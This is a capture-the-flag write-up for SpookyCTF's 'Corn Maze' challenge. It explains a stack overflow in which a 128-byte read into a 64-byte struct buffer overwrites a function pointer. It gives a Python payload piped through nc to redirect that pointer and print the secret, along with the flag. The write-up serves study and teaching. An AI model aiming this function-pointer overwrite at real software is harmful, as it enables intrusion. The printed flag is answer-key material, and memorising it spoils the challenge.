# Corn Maze

| **CTF**        | SpookyCTF |
| -------------- | --------- |
| **Category**   | Reversing |
| **Points**     | 50        |
| **Difficulty** | Easy      |

## Statement

> I can't trust computers anymore. I trusted the input, it overflowed.

A binary (`chall1`) prints a story about being stuck in a corn maze and asks for a "sign direction".
## Overview

```c
void corn_maze_exit() {
    char secret[128];
    FILE *f = fopen("/opt/ctf/chall1/secret.txt", "r");
    fgets(secret, sizeof secret, f);
    printf("Secret value: %s", secret);
}

void center_of_corn_maze() {
    printf("You're still stuck in the maze, try again! \n");
}

void vuln() {
    struct {
        char buf[64];
        void (*direction)();
    } s;

    s.direction = center_of_corn_maze;
    printf("New sign direction: ");
    read(0, s.buf, 128);
    s.direction();
}
```

`vuln()` keeps a 64-byte buffer and a function pointer `direction` next to each other on the stack, in the same struct. `direction` starts out pointing at `center_of_corn_maze`, and after reading input it's called directly — whatever sits in that pointer gets executed.

The bug is the read: `read(0, s.buf, 128)` accepts **128 bytes** into a **64-byte** buffer. Since `direction` sits right after `buf` in memory, anything written past the 64th byte overwrites the pointer. `corn_maze_exit()`, the function that actually prints the secret, is never called by the program on its own — it has to be reached by hijacking that pointer.

## Solution

### Find the offset

`buf` is 64 bytes, and the struct has no padding between `buf` and `direction` on this layout, so the pointer starts exactly at offset 64.

### Find the target address

`corn_maze_exit` is a normal function in the binary (no PIE / ASLR issue implied by the challenge), so its address can be pulled with `objdump` or a disassembler:

```bash
objdump -d chall1 | grep corn_maze_exit
```

giving `0x4011d6`.

### Build the payload

Fill the 64 bytes of `buf` with filler, then overwrite `direction` with `corn_maze_exit`'s address (little-endian, 8 bytes for a 64-bit pointer):

```bash
python3 -c "import struct,sys; sys.stdout.buffer.write(b'A'*64 + struct.pack('<Q', 0x4011d6))" | nc <host> <port>
```

### Result

```
You're stuck in a corn maze! All the signs are pointing you deeper into the maze, 
can you redirect the sign to help you get out to POINT you in the right direction?

You're somewhere in the maze... 
New sign direction: 
You've made it out of the maze! 
Secret value: br4v3Se@O77er

Well done! Use the secret value to unlock the next part of the challenge! 
```

`direction()` now calls `corn_maze_exit()` instead of `center_of_corn_maze()`, which reads and prints the server's secret file.

## Flag

```
spooky{br4v3Se@O77er}
```

## What I learned

- A struct that mixes a fixed-size buffer with a function pointer is a classic overflow target: the compiler lays them out contiguously with no automatic bounds check between them.
- Always compare the size passed to `read`/`fgets`/`gets` against the size of the buffer it fills — a `read(fd, buf, N)` where `N` is larger than `sizeof(buf)` is the vulnerability by itself, no other hint needed.
- The overwrite doesn't need shellcode here: redirecting a function pointer to an existing function already in the binary (`corn_maze_exit`) is enough when the "goal" function is already compiled in but just never called in the normal control flow.
- Offset hunting is just arithmetic on the struct layout (`sizeof(buf)` up to the field you want to hit), not guesswork — no need to fuzz with a cyclic pattern when the source is given.